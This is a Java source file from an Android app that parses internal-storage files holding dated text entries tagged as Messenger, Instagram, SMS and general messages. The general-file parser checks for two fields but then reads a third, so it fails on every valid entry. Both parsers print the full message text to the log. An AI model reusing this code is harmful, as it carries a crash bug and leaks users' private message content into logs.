package androidaid.android.com.androidaid.storage;

import com.google.android.gms.auth.api.signin.internal.Storage;

import java.io.File;
import java.util.ArrayList;

import androidaid.android.com.androidaid.core.StringKeeper;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.utilities.StringUtils;

public class InternalStorageParser {
    /*
    Index0: field_text_messenger
    Index1: field_text_instagram
    Index2: field_text_sms
    Index3: field_text_general
     */
    public static ArrayList<ArrayList<InternalStorageFileData>> storageText = new ArrayList<>();

    /**
     * This method parses the content of all of the files inside the internal storage and returns it as a List of String arrays.
     * Indexes in the String[] are as follows:
     *   - [0]: field_text_messenger
     *   - [1]: field_text_instagram
     *   - [2]: field_text_SMS
     *   - [3]: field_text_ALL
     * @return
     */
    public static ArrayList<ArrayList<? extends InternalStorageFileData>> parseInternalStorage() {
        System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Started parsing internal storage.");
        ArrayList<ArrayList<? extends InternalStorageFileData>> parsedFileContents = new ArrayList<>();

        ArrayList<File> internalStorageFiles = InternalStorageManager.getAllInternalStorageFiles();

        for (int i = 0; i<internalStorageFiles.size(); i++) {
            File currentFile = internalStorageFiles.get(i);
            System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Reading file " + currentFile.getAbsolutePath());

            switch(i) {
                case 0:
                    //this is the messenger file
                    parsedFileContents.add(parseInternalStorageFileRegular(currentFile));
                    break;
                case 1:
                    //this is the instagram file
                    parsedFileContents.add(parseInternalStorageFileRegular(currentFile));
                    break;
                case 2:
                    parsedFileContents.add(parseInternalStorageFileRegular(currentFile));
                    break;
                case 3:
                    parsedFileContents.add(parseInternalStorageFileGeneral(currentFile));
                    break;
            }
        }
        System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Returning the parsed file contents.");
        return parsedFileContents;
    }

    /**
     * Used for parsing internal storage files such as messenger or instagram, using the format ||| Date || Text |||
     */
    private static ArrayList<InternalStorageFileData> parseInternalStorageFileRegular(File currentFile) {
        String allText = InternalStorageManager.readFromFile(currentFile);
        ArrayList<InternalStorageFileData> parsedData = new ArrayList<>();

        System.out.println("[sproc32.storage.ISP.parseInternalStorage]: All of the text from this file: '" + allText + "'." );

        if(!allText.equals("")) {
            String[] textData = allText.split(Constants.REGEX_STORAGE_TEXT_STARTEND_SEPARATOR);
            System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Found " + textData.length + " text data elements.");

            for (String currentTextData : textData) {
                String subTextData[] = currentTextData.split(Constants.REGEX_STORAGE_TEXT_SEMISEPARATOR);
                System.out.println("[sproc32.storage.ISP.parseInternalStorage]: SubTextData contains " + subTextData.length + " elements. Displaying them.");
                StringUtils.displayArray(subTextData);

                if(subTextData.length == 2) {
                    String dateAndTime = subTextData[0];
                    String text = subTextData[1];
                    System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Current text data element: " + dateAndTime + " | " + text);

                    InternalStorageFileData isfd = new InternalStorageFileData(dateAndTime, text);
                    parsedData.add(isfd);
                } else {
                    System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Faulty subTextData. Displaying it: ");
                    StringUtils.displayArray(subTextData);
                }
            }

        }

        return parsedData;
    }

    private static ArrayList<InternalStorageFileDataGeneral> parseInternalStorageFileGeneral(File currentFile) {
        String allText = InternalStorageManager.readFromFile(currentFile);
        ArrayList<InternalStorageFileDataGeneral> parsedData = new ArrayList<>();

        System.out.println("[sproc32.storage.ISP.parseInternalStorage]: All of the text from this file: '" + allText + "'." );

        if(!allText.equals("")) {
            String[] textData = allText.split(Constants.REGEX_STORAGE_TEXT_STARTEND_SEPARATOR); //vertical bar is a special character... has to be escaped!
            System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Found " + textData.length + " text data elements.");

            for(String currentTextData : textData) {
                String subTextData[] = currentTextData.split(Constants.REGEX_STORAGE_TEXT_SEMISEPARATOR);

                if(subTextData.length == 2) {
                    String dateAndTime = subTextData[0];
                    String text = subTextData[1];
                    String source = subTextData[2];
                    System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Current text data element: " + dateAndTime + " | " + text + " | " + source);

                    InternalStorageFileDataGeneral isfdg = new InternalStorageFileDataGeneral(dateAndTime, text, source);
                    parsedData.add(isfdg);
                } else {
                    System.out.println("[sproc32.storage.ISP.parseInternalStorage]: Faulty subTextData. Displaying it: ");
                    StringUtils.displayArray(subTextData);
                }
            }
        }

        return parsedData;

    }
}
